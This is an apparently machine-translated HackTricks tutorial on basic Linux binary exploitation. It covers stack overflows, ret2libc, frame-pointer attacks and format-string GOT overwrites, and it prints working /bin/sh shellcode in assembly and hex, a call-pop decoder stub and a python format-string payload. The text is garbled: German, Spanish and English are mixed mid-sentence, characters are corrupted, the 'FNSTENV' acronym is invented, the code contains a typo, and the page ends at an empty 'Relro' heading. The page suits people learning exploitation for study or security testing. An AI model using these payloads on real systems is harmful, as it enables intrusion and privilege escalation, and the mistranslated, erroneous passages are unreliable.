# Linux Exploiting (Basic) (SPA)

<details>

<summary><strong>Erfahren Sie AWS-Hacking von Null auf Held mit</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Andere M√∂glichkeiten, HackTricks zu unterst√ºtzen:

* Wenn Sie Ihr **Unternehmen in HackTricks beworben sehen m√∂chten** oder **HackTricks im PDF-Format herunterladen m√∂chten**, √ºberpr√ºfen Sie die [**ABONNEMENTPL√ÑNE**](https://github.com/sponsors/carlospolop)!
* Holen Sie sich das [**offizielle PEASS & HackTricks-Merch**](https://peass.creator-spring.com)
* Entdecken Sie [**The PEASS Family**](https://opensea.io/collection/the-peass-family), unsere Sammlung exklusiver [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Treten Sie der** üí¨ [**Discord-Gruppe**](https://discord.gg/hRep4RUj7f) oder der [**Telegram-Gruppe**](https://t.me/peass) bei oder **folgen** Sie uns auf **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Teilen Sie Ihre Hacking-Tricks, indem Sie PRs an die** [**HackTricks**](https://github.com/carlospolop/hacktricks) und [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) GitHub-Repositories senden.

</details>

## **1.STACK OVERFLOWS**

> buffer overflow, buffer overrun, stack overrun, stack smashing

Segmentierungsfehler oder Segmentierungsverletzung: Wenn versucht wird, auf eine Speicheradresse zuzugreifen, die dem Prozess nicht zugewiesen wurde.

Um die Adresse einer Funktion innerhalb eines Programms zu erhalten, kann dies getan werden:
```
objdump -d ./PROGRAMA | grep FUNCION
```
## ROP

### Aufruf von sys\_execve

{% content-ref url="rop-syscall-execv.md" %}
[rop-syscall-execv.md](rop-syscall-execv.md)
{% endcontent-ref %}

## **2.SHELLCODE**

View kernel interrupts: cat /usr/include/i386-linux-gnu/asm/unistd\_32.h | grep ‚Äú\_\_NR\_‚Äù

setreuid(0,0); // \_\_NR\_setreuid 70\
execve(‚Äú/bin/sh‚Äù, args\[], NULL); // \_\_NR\_execve 11\
exit(0); // \_\_NR\_exit 1

xor eax, eax ; clear eax\
xor ebx, ebx ; ebx = 0 because there are no arguments to pass\
mov al, 0x01 ; eax = 1 ‚Äî> \_\_NR\_exit 1\
int 0x80 ; Execute syscall

**nasm -f elf assembly.asm** ‚Äî> Returns a .o file\
**ld assembly.o -o shellcodeout** ‚Äî> Generates an executable with the assembly code and we can extract the opcodes with **objdump**\
**objdump -d -Mintel ./shellcodeout** ‚Äî> To verify that it is indeed our shellcode and extract the OpCodes

**Verify that the shellcode works**
```
char shellcode[] = ‚Äú\x31\xc0\x31\xdb\xb0\x01\xcd\x80‚Äù

void main(){
void (*fp) (void);
fp = (void *)shellcode;
fp();
}<span id="mce_marker" data-mce-type="bookmark" data-mce-fragment="1">‚Äã</span>
```
Para verificar, ob die Systemaufrufe korrekt ausgef√ºhrt werden, muss das vorherige Programm kompiliert werden und die Systemaufrufe sollten in **strace ./KOMPILIERTE\_PROGRAMM** erscheinen.

Beim Erstellen von Shellcodes kann ein Trick angewendet werden. Die erste Anweisung ist ein Sprung zu einem Aufruf. Der Aufruf ruft den Originalcode auf und legt zus√§tzlich das EIP im Stack ab. Nach der Aufrufanweisung haben wir den ben√∂tigten String platziert, sodass wir mit diesem EIP auf den String zeigen und den Code weiter ausf√ºhren k√∂nnen.

BEISPIEL **TRICK (/bin/sh)**:
```
jmp                 0x1f                                        ; Salto al √∫ltimo call
popl                %esi                                       ; Guardamos en ese la direcci√≥n al string
movl               %esi, 0x8(%esi)       ; Concatenar dos veces el string (en este caso /bin/sh)
xorl                 %eax, %eax             ; eax = NULL
movb  %eax, 0x7(%esi)     ; Ponemos un NULL al final del primer /bin/sh
movl               %eax, 0xc(%esi)      ; Ponemos un NULL al final del segundo /bin/sh
movl   $0xb, %eax               ; Syscall 11
movl               %esi, %ebx               ; arg1=‚Äú/bin/sh‚Äù
leal                 0x8(%esi), %ecx      ; arg[2] = {‚Äú/bin/sh‚Äù, ‚Äú0‚Äù}
leal                 0xc(%esi), %edx      ; arg3 = NULL
int                    $0x80                         ; excve(‚Äú/bin/sh‚Äù, [‚Äú/bin/sh‚Äù, NULL], NULL)
xorl                 %ebx, %ebx             ; ebx = NULL
movl   %ebx, %eax
inc                   %eax                          ; Syscall 1
int                    $0x80                         ; exit(0)
call                  -0x24                          ; Salto a la primera instruci√≥n
.string             \‚Äù/bin/sh\‚Äù                               ; String a usar<span id="mce_marker" data-mce-type="bookmark" data-mce-fragment="1">‚Äã</span>
```
**EJ mit dem Stack(/bin/sh) verwenden:**
```
section .text
global _start
_start:
xor                  eax, eax                     ;Limpieza
mov                al, 0x46                      ; Syscall 70
xor                  ebx, ebx                     ; arg1 = 0
xor                  ecx, ecx                     ; arg2 = 0
int                    0x80                           ; setreuid(0,0)
xor                  eax, eax                     ; eax = 0
push   eax                             ; ‚Äú\0‚Äù
push               dword 0x68732f2f ; ‚Äú//sh‚Äù
push               dword 0x6e69622f; ‚Äú/bin‚Äù
mov                ebx, esp                     ; arg1 = ‚Äú/bin//sh\0‚Äù
push               eax                             ; Null -> args[1]
push               ebx                             ; ‚Äú/bin/sh\0‚Äù -> args[0]
mov                ecx, esp                     ; arg2 = args[]
mov                al, 0x0b                      ; Syscall 11
int                    0x80                           ; excve(‚Äú/bin/sh‚Äù, args[‚Äú/bin/sh‚Äù, ‚ÄúNULL‚Äù], NULL)
```
**EJ FNSTENV:**  
EJ FNSTENV steht f√ºr "Extended Jump Far Not Save Environment". Es ist ein Befehl, der verwendet wird, um den FPU-Zustand zu speichern.
```
fabs
fnstenv [esp-0x0c]
pop eax                     ; Guarda el EIP en el que se ejecut√≥ fabs
‚Ä¶
```
**Egg Hunter:**

Besteht aus einem kleinen Code, der die Speicherseiten eines Prozesses nach der dort gespeicherten Shellcode durchsucht (sucht nach einer Signatur im Shellcode). N√ºtzlich in F√§llen, in denen nur wenig Platz zum Einspritzen von Code zur Verf√ºgung steht.

**Polymorphe Shellcodes**

Es handelt sich um verschl√ºsselte Shells, die √ºber kleine Codes verf√ºgen, die sie entschl√ºsseln und zu ihnen springen lassen, unter Verwendung des Call-Pop-Tricks w√§re dies ein **Beispiel f√ºr eine Caesar-Verschl√ºsselung**:
```
global _start
_start:
jmp short magic
init:
pop     esi
xor      ecx, ecx
mov    cl,0                              ; Hay que sustituir el 0 por la longitud del shellcode (es lo que recorrer√°)
desc:
sub     byte[esi + ecx -1], 0 ; Hay que sustituir el 0 por la cantidad de bytes a restar (cifrado cesar)
sub     cl, 1
jnz       desc
jmp     short sc
magic:
call init
sc:
;Aqu√≠ va el shellcode
```
1. **Angriff auf den Frame-Pointer (EBP)**

N√ºtzlich in einer Situation, in der wir den EBP √§ndern k√∂nnen, aber nicht den EIP.

Es ist bekannt, dass beim Verlassen einer Funktion der folgende Assemblercode ausgef√ºhrt wird:
```
movl               %ebp, %esp
popl                %ebp
ret
```
De esta forma, wenn das EBP beim Verlassen einer Funktion (fvuln), die von einer anderen Funktion aufgerufen wurde, ge√§ndert werden kann, kann das EIP ge√§ndert werden, wenn die Funktion, die fvuln aufgerufen hat, endet.

In fvuln kann ein falsches EBP eingef√ºgt werden, das auf eine Stelle zeigt, an der die Adresse des Shellcodes + 4 (4 f√ºr das Pop) liegt. So wird beim Verlassen der Funktion der Wert von &(\&Shellcode)+4 in ESP platziert, mit dem Pop wird 4 von ESP abgezogen und er zeigt auf die Adresse des Shellcodes, wenn das ret ausgef√ºhrt wird.

**Exploit:**\
\&Shellcode + "AAAA" + SHELLCODE + F√ºllung + &(\&Shellcode)+4

**Off-by-One Exploit**\
Es ist nur m√∂glich, das am wenigsten signifikante Byte des EBP zu √§ndern. Ein Angriff wie oben beschrieben kann durchgef√ºhrt werden, aber der Speicher, der die Adresse des Shellcodes speichert, muss die ersten 3 Bytes mit dem EBP teilen.

## **4. Return-to-Libc-Methoden**

N√ºtzliche Methode, wenn der Stack nicht ausf√ºhrbar ist oder nur einen sehr kleinen Puffer zum √Ñndern bietet.

ASLR bewirkt, dass Funktionen bei jeder Ausf√ºhrung an unterschiedlichen Speicherpositionen geladen werden. Daher kann diese Methode in diesem Fall m√∂glicherweise nicht wirksam sein. F√ºr Remote-Server, da das Programm st√§ndig an derselben Adresse ausgef√ºhrt wird, kann es jedoch n√ºtzlich sein.

* **cdecl(C-Deklaration)** Legt die Argumente auf den Stack und bereinigt den Stack nach Verlassen der Funktion
* **stdcall(Standardaufruf)** Legt die Argumente auf den Stack und die aufrufende Funktion bereinigt den Stack
* **fastcall** Legt die ersten beiden Argumente in Register und den Rest auf den Stack

Die Adresse der libc-Systemanweisung wird platziert und der String "/bin/sh" wird als Argument √ºbergeben, normalerweise aus einer Umgebungsvariable. Au√üerdem wird die Adresse der exit-Funktion verwendet, damit das Programm nach Beendigung der Shell ohne Probleme beendet wird (und Logs geschrieben werden).

**export SHELL=/bin/sh**

Um die ben√∂tigten Adressen zu finden, kann man innerhalb von **GDB** nachsehen:\
**p system**\
**p exit**\
**rabin2 -i ausf√ºhrbare Datei** ‚Äî> Gibt die Adressen aller Funktionen im Programm beim Laden an\
(Innerhalb eines Starts oder eines Breakpoints): **x/500s $esp** ‚Äî> Hier suchen wir nach dem String /bin/sh

Sobald wir diese Adressen haben, sieht der **Exploit** wie folgt aus:

‚ÄúA‚Äù \* EBP-ABSTAND + 4 (EBP: k√∂nnen 4 "A"s sein, aber es ist besser, wenn es das echte EBP ist, um Segmentierungsfehler zu vermeiden) + Adresse von **system** (√ºberschreibt das EIP) + Adresse von **exit** (beim Verlassen von system(‚Äú/bin/sh‚Äù) wird diese Funktion aufgerufen, da die ersten 4 Bytes des Stacks als die n√§chste auszuf√ºhrende EIP-Adresse behandelt werden) + Adresse von ‚Äú**/bin/sh**‚Äù (wird als Parameter an system √ºbergeben)

Auf diese Weise wird das EIP mit der Adresse von system √ºberschrieben, die den String "/bin/sh" als Parameter erh√§lt und beim Verlassen dieses die Funktion exit() ausf√ºhrt.

Es kann vorkommen, dass ein Byte einer Adressfunktion null oder Leerzeichen (\x20) ist. In diesem Fall k√∂nnen die vorherigen Adressen disassembliert werden, da wahrscheinlich mehrere NOPs vorhanden sind, die es erm√∂glichen, einen von ihnen anstelle der Funktion direkt aufzurufen (zum Beispiel mit > x/8i system-4).

Diese Methode funktioniert, da beim Aufruf einer Funktion wie system mit dem Opcode **ret** anstelle von **call** die Funktion davon ausgeht, dass die ersten 4 Bytes die **EIP**-Adresse sind, zu der zur√ºckgekehrt werden soll.

Eine interessante Technik bei dieser Methode ist das Aufrufen von **strncpy()**, um ein Nutzlast vom Stack auf den Heap zu verschieben und anschlie√üend **gets()** zu verwenden, um diese Nutzlast auszuf√ºhren.

Eine weitere interessante Technik ist die Verwendung von **mprotect()**, die es erm√∂glicht, die gew√ºnschten Berechtigungen f√ºr jeden Teil des Speichers zuzuweisen. Es funktionierte oder funktionierte in BDS, MacOS und OpenBSD, aber nicht in Linux (es wird kontrolliert, dass Schreib- und Ausf√ºhrungsberechtigungen nicht gleichzeitig erteilt werden k√∂nnen). Mit diesem Angriff k√∂nnte der Stack wieder als ausf√ºhrbar konfiguriert werden.

**Funktionsverkettung**

Basierend auf der vorherigen Technik besteht dieser Exploit darin:\
F√ºllung + \&Funktion1 + \&pop;ret; + \&arg\_fun1 + \&Funktion2 + \&pop;ret; + \&arg\_fun2 + ‚Ä¶

Auf diese Weise k√∂nnen Funktionen verkettet werden, die aufgerufen werden sollen. Au√üerdem k√∂nnen, wenn Funktionen mit mehreren Argumenten verwendet werden sollen, die erforderlichen Argumente (z. B. 4) platziert und die 4 Argumente eingegeben werden und nach einer Adresse mit Opcodes gesucht werden: pop, pop, pop, pop, ret ‚Äî> **objdump -d ausf√ºhrbare Datei**

**Verkettung durch F√§lschen von Frames (EBP-Verkettung)**

Es besteht darin, die M√∂glichkeit zu nutzen, das EBP zu manipulieren, um die Ausf√ºhrung mehrerer Funktionen durch EBP und "leave;ret" zu verketten.

F√úLLUNG

* Setzen Sie im EBP ein falsches EBP, das auf zeigt: 2. falsches EBP + die auszuf√ºhrende Funktion: (\&system() + \&leave;ret + &‚Äú/bin/sh‚Äù)
* Setzen Sie im EIP als Adresse eine Funktion &(leave;ret)

Starten Sie die Shellcode mit der Adresse zum n√§chsten Teil des Shellcodes, z. B.: 2. falsches EBP + \&system() + &(leave;ret;) + &‚Äù/bin/sh‚Äù

das 2. EBP w√§re: 3. falsches EBP + \&system() + &(leave;ret;) + &‚Äù/bin/ls‚Äù

Dieser Shellcode kann endlos in den Speicherbereichen wiederholt werden, auf die zugegriffen werden kann, sodass ein Shellcode leicht in kleine Speicherst√ºcke unterteilt werden kann.

(Die Ausf√ºhrung von Funktionen wird durch die vorherigen EBP- und ret2lib-Schwachstellen verkn√ºpft)

## **5. Zus√§tzliche Methoden**

**Ret2Ret**

N√ºtzlich, wenn eine Adresse vom Stack nicht in das EIP eingef√ºgt werden kann (es wird √ºberpr√ºft, dass das EIP nicht 0xbf enth√§lt) oder wenn der Speicherort des Shellcodes nicht berechnet werden kann. Die anf√§llige Funktion akzeptiert jedoch einen Parameter (der Shellcode wird hier platziert).

Auf diese Weise wird durch √Ñndern des EIP in eine Adresse zu einem **ret** die n√§chste Adresse geladen (die die Adresse des ersten Arguments der Funktion ist). Das bedeutet, dass der Shellcode geladen wird.

Der Exploit w√ºrde sein: SHELLCODE + F√ºllung (bis EIP) + **\&ret** (die n√§chsten Bytes des Stacks zeigen auf den Beginn des Shellcodes, da die Adresse des √ºbergebenen Parameters in den Stack eingef√ºgt wird)

Es scheint, dass Funktionen wie **strncpy** nach Abschluss die Adresse, an der der Shellcode gespeichert war, vom Stack entfernen und diese Technik unm√∂glich machen. Das bedeutet, dass die Adresse, die der Funktion als Argument √ºbergeben wird (die den Shellcode speichert), durch ein 0x00 ersetzt wird, sodass beim zweiten **ret** ein 0x00 gefunden wird und das Programm abst√ºrzt.
```
**Ret2PopRet**
```
Si wir keine Kontrolle √ºber das erste Argument haben, aber √ºber das zweite oder dritte, k√∂nnen wir EIP mit einer Adresse zu pop-ret oder pop-pop-ret √ºberschreiben, je nach Bedarf.

**Murats Technik**

In Linux werden alle Programme ab 0xbfffffff gemappt.

Durch das Betrachten des Aufbaus des Stacks eines neuen Prozesses in Linux kann ein Exploit entwickelt werden, sodass das Programm in einer Umgebung gestartet wird, in der nur eine Variable vorhanden ist: die Shellcode. Die Adresse dieser kann dann berechnet werden als: addr = 0xbfffffff - 4 - strlen(KOMPLETTER_AUSF√úHRBARER_NAME) - strlen(shellcode)

Auf diese Weise kann die Adresse, an der sich die Umgebungsvariable mit der Shellcode befindet, einfach erhalten werden.

Dies ist m√∂glich, da die Funktion execle es erm√∂glicht, eine Umgebung zu erstellen, die nur die gew√ºnschten Umgebungsvariablen enth√§lt.

**Jump to ESP: Windows-Stil**

Da ESP immer auf den Beginn des Stacks zeigt, besteht diese Technik darin, EIP durch die Adresse eines **jmp esp** oder **call esp** zu ersetzen. Auf diese Weise wird der Shellcode nach der √úberschreibung des EIP gespeichert, da nach dem Ausf√ºhren des **ret** ESP auf die n√§chste Adresse zeigt, genau dort, wo der Shellcode gespeichert wurde.

Wenn ASLR in Windows oder Linux nicht aktiviert ist, k√∂nnen **jmp esp** oder **call esp** aus einem gemeinsam genutzten Objekt aufgerufen werden. Wenn ASLR aktiviert ist, k√∂nnte innerhalb des anf√§lligen Programms gesucht werden.

Dar√ºber hinaus erm√∂glicht die Platzierung des Shellcodes nach der EIP-Korruption anstelle in der Mitte des Stacks, dass die push- oder pop-Anweisungen, die w√§hrend der Funktion ausgef√ºhrt werden, den Shellcode nicht ber√ºhren (was passieren k√∂nnte, wenn er in der Mitte des Stacks der Funktion platziert w√ºrde).

Auf √§hnliche Weise, wenn bekannt ist, dass eine Funktion die Adresse speichert, an der der Shellcode gespeichert ist, kann **call eax** oder **jmp eax (ret2eax)** aufgerufen werden.

**Integer-√úberl√§ufe**

Diese Art von √úberl√§ufen tritt auf, wenn eine Variable nicht darauf vorbereitet ist, eine so gro√üe Zahl wie die √ºbergebene zu verarbeiten, m√∂glicherweise aufgrund einer Verwechslung zwischen vorzeichenbehafteten und vorzeichenlosen Variablen, zum Beispiel:
```c
#include <stdion.h>
#include <string.h>
#include <stdlib.h>

int main(int argc, char *argv[]){
int len;
unsigned int l;
char buffer[256];
int i;
len = l = strtoul(argv[1], NULL, 10);
printf("\nL = %u\n", l);
printf("\nLEN = %d\n", len);
if (len >= 256){
printf("\nLongitus excesiva\n");
exit(1);
}
if(strlen(argv[2]) < l)
strcpy(buffer, argv[2]);
else
printf("\nIntento de hack\n");
return 0;
}
```
En el vorherigen Beispiel sehen wir, dass das Programm 2 Parameter erwartet. Der erste ist die L√§nge des folgenden Strings und der zweite ist der String.

Wenn wir als ersten Parameter eine negative Zahl √ºbergeben, wird angezeigt, dass len < 256 ist und wir diesen Filter passieren, au√üerdem wird auch strlen(buffer) kleiner als l sein, da l ein unsigned int ist und sehr gro√ü sein wird.

Diese Art von Overflows zielt nicht darauf ab, etwas im Prozess des Programms zu schreiben, sondern darauf, schlecht gestaltete Filter zu umgehen, um andere Schwachstellen auszunutzen.

**Nicht initialisierte Variablen**

Es ist nicht bekannt, welchen Wert eine nicht initialisierte Variable annehmen kann, und es k√∂nnte interessant sein, dies zu beobachten. Es k√∂nnte sein, dass sie den Wert annimmt, den eine Variable aus der vorherigen Funktion hatte und diese vom Angreifer kontrolliert wird.

## **Format Strings**

In C ist **`printf`** eine Funktion, die verwendet werden kann, um einen String auszugeben. Der **erste Parameter**, den diese Funktion erwartet, ist der **Roh-Text mit den Formatierern**. Die **folgenden erwarteten Parameter** sind die **Werte**, die die **Formatierer** im Roh-Text **ersetzen** sollen.

Die Schwachstelle tritt auf, wenn ein **Angreifertext als erster Argument** an diese Funktion √ºbergeben wird. Der Angreifer kann einen **speziellen Input erstellen**, indem er die **F√§higkeiten der printf-Formatzeichenfolge missbraucht**, um **beliebige Daten an beliebige Adressen zu schreiben**. Auf diese Weise kann er **beliebigen Code ausf√ºhren**.

Formatierer:
```bash
%08x ‚Äî> 8 hex bytes
%d ‚Äî> Entire
%u ‚Äî> Unsigned
%s ‚Äî> String
%n ‚Äî> Number of written bytes
%hn ‚Äî> Occupies 2 bytes instead of 4
<n>$X ‚Äî> Direct access, Example: ("%3$d", var1, var2, var3) ‚Äî> Access to var3
```
**`%n`** **schreibt** die **Anzahl der geschriebenen Bytes** in die **angegebene Adresse. Indem** wir so viele **Bytes** schreiben, wie die Hexadezimalzahl, die wir **schreiben m√ºssen**, k√∂nnen wir **beliebige Daten schreiben**.
```bash
AAAA%.6000d%4\$n ‚Äî> Write 6004 in the address indicated by the 4¬∫ param
AAAA.%500\$08x ‚Äî> Param at offset 500
```
### GOT (Global Offsets Table) / PLT (Procedure Linkage Table)

Dies ist die Tabelle, die die **Adresse** der vom Programm verwendeten **externen Funktionen** enth√§lt.

Erhalten Sie die Adresse dieser Tabelle mit: **`objdump -s -j .got ./exec`**

![](<../../.gitbook/assets/image (619).png>)

Beobachten Sie, wie Sie nach dem **Laden** des **ausf√ºhrbaren** Codes in GEF die **Funktionen** sehen k√∂nnen, die sich im **GOT** befinden: `gef‚û§ x/20x 0xDIR_GOT`

![](<../../.gitbook/assets/image (620) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (5).png>)

Mit GEF k√∂nnen Sie eine **Debugging-Sitzung starten** und **`got`** ausf√ºhren, um die GOT-Tabelle zu sehen:

![](<../../.gitbook/assets/image (621).png>)

In einem Bin√§rfile enth√§lt das GOT die **Adressen der Funktionen oder** des **PLT**-Abschnitts, der die Funktionsadresse l√§dt. Das Ziel dieses Exploits ist es, den **GOT-Eintrag** einer Funktion zu **√ºberschreiben**, die sp√§ter ausgef√ºhrt wird, **mit** der **Adresse** des PLT der **`system`**-**Funktion**. Idealerweise √ºberschreiben Sie den **GOT** einer **Funktion**, die **mit von Ihnen kontrollierten Parametern** aufgerufen wird (damit Sie die an die Systemfunktion gesendeten Parameter kontrollieren k√∂nnen).

Wenn **`system`** **nicht vom Skript verwendet wird**, wird die Systemfunktion **keinen Eintrag im GOT haben**. In diesem Szenario m√ºssen Sie zuerst die Adresse der `system`-Funktion **leaken**.

**Procedure Linkage Table** ist eine **schreibgesch√ºtzte** Tabelle in der ELF-Datei, die alle erforderlichen **Symbole speichert, die aufgel√∂st werden m√ºssen**. Wenn eine dieser Funktionen aufgerufen wird, wird das **GOT** den **Fluss** zum **PLT umleiten**, damit es die **Adresse** der Funktion aufl√∂sen und sie im GOT speichern kann.\
Dann wird beim **n√§chsten Mal**, wenn an diese Adresse ein Aufruf erfolgt, die **Funktion direkt aufgerufen**, ohne sie erneut aufl√∂sen zu m√ºssen.

Sie k√∂nnen die PLT-Adressen mit **`objdump -j .plt -d ./vuln_binary`** sehen.

### **Exploit-Ablauf**

Wie bereits erkl√§rt, besteht das Ziel darin, die **Adresse** einer **Funktion** in der **GOT-Tabelle zu √ºberschreiben**, die sp√§ter aufgerufen wird. Idealerweise k√∂nnten wir die **Adresse auf einen Shellcode** setzen, der sich in einem ausf√ºhrbaren Abschnitt befindet, aber es ist sehr wahrscheinlich, dass Sie keinen Shellcode in einem ausf√ºhrbaren Abschnitt schreiben k√∂nnen.\
Eine andere Option besteht darin, eine **Funktion zu √ºberschreiben**, die ihre **Argumente** vom **Benutzer erh√§lt** und sie auf die **`system`**-**Funktion** verweist.

Um die Adresse zu schreiben, werden normalerweise 2 Schritte ausgef√ºhrt: Sie **schreiben zuerst 2 Bytes** der Adresse und dann die anderen 2. Dazu wird **`$hn`** verwendet.

**HOB** bezieht sich auf die 2 h√∂heren Bytes der Adresse\
**LOB** bezieht sich auf die 2 niedrigeren Bytes der Adresse

Daher m√ºssen Sie aufgrund der Funktionsweise des Formatstrings zuerst das kleinere der \[HOB, LOB] schreiben und dann das andere.

Wenn HOB < LOB\
`[adresse+2][adresse]%.[HOB-8]x%[offset]\$hn%.[LOB-HOB]x%[offset+1]`

Wenn HOB > LOB\
`[adresse+2][adresse]%.[LOB-8]x%[offset+1]\$hn%.[HOB-LOB]x%[offset]`

HOB LOB HOB\_shellcode-8 N¬∫Param\_dir\_HOB LOB\_shell-HOB\_shell N¬∫Param\_dir\_LOB

\`python -c 'print "\x26\x97\x04\x08"+"\x24\x97\x04\x08"+ "%.49143x" + "%4$hn" + "%.15408x" + "%5$hn"'\`

### **Format String Exploit Template**

Sie finden hier eine **Vorlage**, um das GOT mithilfe von Formatstrings auszunutzen:

{% content-ref url="format-strings-template.md" %}
[format-strings-template.md](format-strings-template.md)
{% endcontent-ref %}

### **.fini\_array**

Im Wesentlichen handelt es sich dabei um eine Struktur mit **Funktionen, die aufgerufen werden**, bevor das Programm endet. Dies ist interessant, wenn Sie Ihren **Shellcode aufrufen k√∂nnen, indem Sie zu einer Adresse springen**, oder in F√§llen, in denen Sie erneut zum Hauptprogramm zur√ºckkehren m√ºssen, um **den Formatstring ein zweites Mal auszunutzen**.
```bash
objdump -s -j .fini_array ./greeting

./greeting:     file format elf32-i386

Contents of section .fini_array:
8049934 a0850408

#Put your address in 0x8049934
```
Hinweis, dass dies **keine** **endlose Schleife** erzeugt, da der Canary bemerken wird, dass das Ende des Stapels m√∂glicherweise besch√§digt ist und die Funktion nicht erneut aufgerufen wird. Daher k√∂nnen Sie mit diesem **1 weitere Ausf√ºhrung** der Schwachstelle haben.

### **Format Strings zum Dumpen von Inhalten**

Ein Format-String kann auch missbraucht werden, um Inhalte aus dem Speicher des Programms zu **dumpen**.\
Zum Beispiel gibt es in der folgenden Situation eine **lokale Variable im Stapel, die auf eine Flagge zeigt**. Wenn Sie herausfinden, wo im **Speicher** der **Zeiger** auf die **Flagge** ist, k√∂nnen Sie **printf** dazu bringen, auf diese **Adresse** zuzugreifen und die **Flagge** auszugeben:

Also, die Flagge ist in **0xffffcf4c**

![](<../../.gitbook/assets/image (618) (2).png>)

Und aus dem Leak k√∂nnen Sie sehen, dass der **Zeiger auf die Flagge** im **8. Parameter** liegt:

![](<../../.gitbook/assets/image (623).png>)

Daher k√∂nnen Sie durch den **Zugriff auf den 8. Parameter** die Flagge erhalten:

![](<../../.gitbook/assets/image (624).png>)

Beachten Sie, dass Sie nach dem **vorherigen Exploit** und der Erkenntnis, dass Sie Inhalte **leaken** k√∂nnen, **Zeiger** auf **`printf`** auf den Abschnitt setzen k√∂nnen, in dem das **ausf√ºhrbare** Programm **geladen** ist, und es **vollst√§ndig dumpen**!

### **DTOR**

{% hint style="danger" %}
Heutzutage ist es sehr **selten, ein Bin√§r mit einem dtor-Abschnitt zu finden**.
{% endhint %}

Die Destruktoren sind Funktionen, die **ausgef√ºhrt werden, bevor das Programm endet**.\
Wenn es Ihnen gelingt, eine **Adresse** zu einem **Shellcode** in **`__DTOR_END__`** zu **schreiben**, wird dies **ausgef√ºhrt**, bevor das Programm endet.\
Holen Sie sich die Adresse dieses Abschnitts mit:
```bash
objdump -s -j .dtors /exec
rabin -s /exec | grep ‚Äú__DTOR‚Äù
```
Normalerweise finden Sie den **DTOR**-Abschnitt **zwischen** den Werten `ffffffff` und `00000000`. Wenn Sie also nur diese Werte sehen, bedeutet dies, dass **keine Funktion registriert ist**. √úberschreiben Sie also die **`00000000`** mit der **Adresse** des **Shellcodes**, um ihn auszuf√ºhren.

### **Format Strings f√ºr Puffer√ºberl√§ufe**

**sprintf** verschiebt einen formatierten String **in** eine **Variable**. Daher k√∂nnten Sie die **Formatierung** eines Strings missbrauchen, um einen **Puffer√ºberlauf in der Variablen** zu verursachen, in die der Inhalt kopiert wird.\
Beispielsweise schreibt das Payload `%.44xAAAA` 44B+"AAAA" in die Variable, was einen Puffer√ºberlauf verursachen kann.

### **\_\_atexit-Strukturen**

{% hint style="danger" %}
Heutzutage ist es sehr **seltsam, dies auszunutzen**.
{% endhint %}

**`atexit()`** ist eine Funktion, der **andere Funktionen als Parameter √ºbergeben werden**. Diese **Funktionen** werden ausgef√ºhrt, wenn ein **`exit()`** ausgef√ºhrt wird oder das **Hauptprogramm** beendet wird.\
Wenn Sie die **Adresse** einer dieser **Funktionen** so √§ndern k√∂nnen, dass sie beispielsweise auf einen Shellcode zeigt, k√∂nnen Sie die **Kontrolle** √ºber den **Prozess** erlangen, aber dies ist derzeit komplizierter.\
Derzeit sind die **Adressen der auszuf√ºhrenden Funktionen** hinter mehreren Strukturen versteckt, und schlie√ülich sind die Adressen, auf die sie zeigen, nicht die Adressen der Funktionen, sondern sind **verschl√ºsselt mit XOR** und Verschiebungen mit einem **zuf√§lligen Schl√ºssel**. Daher ist dieser Angriffsvektor derzeit **zumindest auf x86** und **x64\_86** nicht sehr n√ºtzlich.\
Die **Verschl√ºsselungsfunktion** ist **`PTR_MANGLE`**. **Andere Architekturen** wie m68k, mips32, mips64, aarch64, arm, hppa... **implementieren die Verschl√ºsselungsfunktion nicht**, da sie das Gleiche zur√ºckgeben wie sie als Eingabe erhalten haben. Daher w√§ren diese Architekturen durch diesen Vektor angreifbar.

### **setjmp() & longjmp()**

{% hint style="danger" %}
Heutzutage ist es sehr **seltsam, dies auszunutzen**.
{% endhint %}

**`Setjmp()`** erm√∂glicht es, den **Kontext** (die Register) zu **speichern**.\
**`longjmp()`** erm√∂glicht es, den **Kontext** zu **wiederherstellen**.\
Die **gespeicherten Register** sind: `EBX, ESI, EDI, ESP, EIP, EBP`\
Das Problem ist, dass EIP und ESP durch die **`PTR_MANGLE`**-Funktion √ºbergeben werden, sodass die **Architektur, die anf√§llig f√ºr diesen Angriff ist, die gleiche ist wie oben**.\
Sie sind n√ºtzlich f√ºr Fehlerbehebung oder Unterbrechungen.\
Jedoch sind nach meinen Recherchen die anderen Register nicht gesch√ºtzt, **so dass bei einem `call ebx`, `call esi` oder `call edi`** innerhalb der aufgerufenen Funktion die Kontrolle √ºbernommen werden kann. Oder Sie k√∂nnten auch EBP √§ndern, um ESP zu √§ndern.

**VTable und VPTR in C++**

Jede Klasse hat eine **Vtable**, die ein Array von **Methodenzeigern** ist.

Jedes Objekt einer **Klasse** hat einen **VPtr**, der ein **Zeiger** auf das Array seiner Klasse ist. Der VPtr ist Teil des Headers jedes Objekts, sodass bei einer **√úberschreibung** des **VPtr** k√∂nnte er **ge√§ndert** werden, um auf eine Dummy-Methode zu zeigen, sodass bei der Ausf√ºhrung einer Funktion der Shellcode aufgerufen wird.

## **Pr√§ventivma√ünahmen und Umgehungen**

**Return-into-printf**

Es handelt sich um eine Technik, um einen Puffer√ºberlauf in einen Formatkettenfehler umzuwandeln. Dabei wird der EIP so ersetzt, dass er auf ein printf der Funktion zeigt und eine manipulierte Formatkette als Argument √ºbergeben wird, um Werte √ºber den Zustand des Prozesses zu erhalten.

**Angriff auf Bibliotheken**

Bibliotheken befinden sich an einer Position mit 16 Bits Zuf√§lligkeit = 65636 m√∂gliche Adressen. Wenn ein anf√§lliger Server fork() aufruft, wird der Speicheradressraum im Kindprozess dupliziert und bleibt intakt. Daher kann versucht werden, einen Brute-Force-Angriff auf die usleep() Funktion von libc durchzuf√ºhren, indem "16" als Argument √ºbergeben wird, sodass, wenn die Antwort l√§nger als √ºblich dauert, diese Funktion gefunden wurde. Wenn bekannt ist, wo sich diese Funktion befindet, kann delta\_mmap erhalten und die anderen berechnet werden.

Die einzige M√∂glichkeit, sicherzustellen, dass ASLR funktioniert, besteht darin, eine 64-Bit-Architektur zu verwenden. Dort gibt es keine Brute-Force-Angriffe.

### Relro

